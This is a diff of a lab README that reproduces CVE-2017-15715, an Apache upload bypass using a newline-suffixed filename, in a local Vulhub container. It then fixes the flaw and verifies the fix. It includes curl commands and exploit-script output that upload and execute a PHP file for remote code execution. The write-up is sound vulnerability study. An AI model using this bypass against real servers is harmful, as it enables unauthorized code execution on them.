@@ -52,29 +52,43 @@ A GitHub Actions pipeline (`.github/workflows/ci.yml`) is configured. On every c
 **Description:** This vulnerability allows attackers to bypass file upload restrictions. By appending a newline character (`\x0A`) to a filename (e.g., `shell.php\n`), the uploader's blacklist check is bypassed, but Apache still parses and executes the file as a PHP script, leading to Remote Code Execution (RCE).
 
 ### Steps to Reproduce
-The vulnerable environment is the official Vulhub one (`vulhub/httpd/CVE-2017-15715`), which runs a PHP 5.5 + Apache 2.4.x stack inside the affected version range, in front of a small file-upload page.
+The vulnerable environment is Vulhub's `httpd/CVE-2017-15715`. It ships a small upload page whose `name` field is only checked against a blacklist of PHP extensions, and the base image is pinned to `php:7.0-apache`, i.e. Apache 2.4.10 running PHP through `mod_php` and the `<FilesMatch \.php$>` handler — exactly the surface this CVE abuses.
 
 ```bash
 git clone https://github.com/vulhub/vulhub.git
 cd vulhub/httpd/CVE-2017-15715
-docker compose up -d          # Apache is published on http://127.0.0.1:8080
+# use the same base image as cve-fix/Dockerfile (Apache 2.4.10 + mod_php)
+sed -i 's#^FROM .*#FROM php:7.0-apache#' Dockerfile
+cp /path/to/secure-api-lab/cve-fix/exploit.py .
+docker compose up --build -d      # upload page on http://localhost:8080/index.php
+python exploit.py
 ```
 
-First confirm that the blacklist blocks a normal PHP upload:
+`exploit.py` (also shipped in `cve-fix/`) walks through the three steps and prints the verdict:
 
-```bash
-printf '<?php echo "pwned"; ?>' > shell.php
-curl -i -F "file=@shell.php" -F "name=1.php" http://127.0.0.1:8080/
-# -> HTTP 200, body: bad file
+1. upload `shell.php` with `name=shell.php` → the extension `php` is blacklisted, the server answers `bad file`;
+2. upload the same bytes with `name=shell.php\n` → `pathinfo()` now yields `php\n`, which is not in the blacklist, so the file is written to disk (HTTP 200);
+3. request `http://localhost:8080/shell.php%0a` → Apache matches `.php$` against `shell.php\n` and executes the payload, returning the `phpinfo()` page.
+
+```
+--- 1. Attempting normal upload of shell.php ---
+[SUCCESS] Normal upload was blocked by the server (as expected).
+
+--- 2. Attempting upload bypass using newline character (\n) ---
+Status Code: 200
+
+--- 3. Attempting to access the uploaded malicious PHP file ---
+[VULNERABLE] Exploit successful! Remote Code Execution (RCE) achieved.
+Check the URL in your browser: http://localhost:8080/shell.php%0a
 ```
 
-Now append a single `\x0A` to the filename (`$'...'` lets bash expand `\x0a`). The extension extracted by `pathinfo()` becomes `php\n`, which is not in the blacklist, so the file is written to disk:
+The same three steps with curl (`$'...'` lets bash expand `\x0a`):
 
 ```bash
-curl -i -F "file=@shell.php" -F $'name=1.php\x0a' http://127.0.0.1:8080/
-# -> HTTP 200, the file is accepted
-curl -i "http://127.0.0.1:8080/1.php%0a"
-# -> HTTP 200 + "pwned": Apache executed the uploaded script
+printf '<?php phpinfo(); ?>' > shell.php
+curl -i -F "file=@shell.php" -F "name=shell.php"      http://localhost:8080/index.php   # -> bad file
+curl -i -F "file=@shell.php" -F $'name=shell.php\x0a' http://localhost:8080/index.php   # -> accepted
+curl -i "http://localhost:8080/shell.php%0a"                                            # -> phpinfo()
 ```
 
 <img width="969" height="291" alt="1漏洞复现2" src="https://github.com/user-attachments/assets/61556fd2-8cff-480a-b4a3-b8c3b25ec2d8" />
@@ -84,26 +98,36 @@ curl -i "http://127.0.0.1:8080/1.php%0a"
 The vulnerability lies in how PHP's `pathinfo()` function and Apache's `<FilesMatch \.php$>` directive handle newline characters. When a filename like `shell.php\n` is uploaded, `pathinfo()` extracts the extension as `php\n`, which bypasses the blacklist (which only checks for `php`). However, Apache's regex `$` anchor matches the newline character, causing Apache to execute the file as PHP. This is a classic case of **improper input validation**.
 
 ### Fix and Verification
-- **Fix Applied**: I modified the `index.php` source code to explicitly block filenames containing newline characters using a regular expression: `if (preg_match('/[\r\n]/', $name)) { exit('bad file'); }`. (The fixed `index.php` and `docker-compose.yml` files are located in the `cve-fix/` directory.)
-- **Environment**: `cve-fix/Dockerfile` deliberately reuses the same vulnerable base image (`vulhub/php:5.5-apache`, PHP 5.5 + Apache 2.4.x in the vulnerable range) and only replaces `index.php`. Keeping the image identical isolates the code change, so the result cannot be explained by an Apache upgrade.
+- **Fix Applied**: I modified the `index.php` source code to explicitly block filenames containing newline characters using a regular expression: `if (preg_match('/[\r\n]/', $name)) { exit('bad file'); }`. (The fixed `index.php`, its `Dockerfile`/`docker-compose.yml` and the reproduction script `exploit.py` are located in the `cve-fix/` directory.)
+- **Environment**: `cve-fix/Dockerfile` reuses the exact same `php:7.0-apache` base as the vulnerable run and only replaces `index.php`. Keeping the image identical isolates the code change, so the result cannot be explained by an Apache upgrade.
 
 ```bash
 cd cve-fix
 docker compose up --build -d
+python exploit.py
 ```
 
-- **Verification**: After applying the fix and restarting the environment, the exact same exploit payload was sent again. The server rejected the upload, returned `bad file` with HTTP 200, and the file was never written to disk — therefore requesting it yields `404 Not Found`. Normal uploads still work:
+- **Verification**: After applying the fix and restarting the environment, the exact same payload was sent again. The POST still answers HTTP 200, but the body is `bad file` and nothing is written to disk, so requesting the file yields `404 Not Found`. Normal uploads still work:
+
+```
+--- 1. Attempting normal upload of shell.php ---
+[SUCCESS] Normal upload was blocked by the server (as expected).
+
+--- 2. Attempting upload bypass using newline character (\n) ---
+Status Code: 200
+
+--- 3. Attempting to access the uploaded malicious PHP file ---
+[SECURE] Exploit failed. The server did not execute the PHP code.
+Response snippet: <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head>
+```
 
 ```bash
-# exploit payload again
-curl -i -F "file=@shell.php" -F $'name=1.php\x0a' http://127.0.0.1:8080/
-# -> HTTP 200, body: bad file
-curl -i "http://127.0.0.1:8080/1.php%0a"
-# -> HTTP 404, the script does not exist
-
 # regression test: a legitimate upload still succeeds
-curl -i -F "file=@shell.php" -F "name=note.txt" http://127.0.0.1:8080/
-curl -i "http://127.0.0.1:8080/note.txt"
+curl -i -F "file=@shell.php" -F "name=note.txt" http://localhost:8080/index.php
+curl -i "http://localhost:8080/note.txt"
 # -> HTTP 200, content is served normally
 ```
 
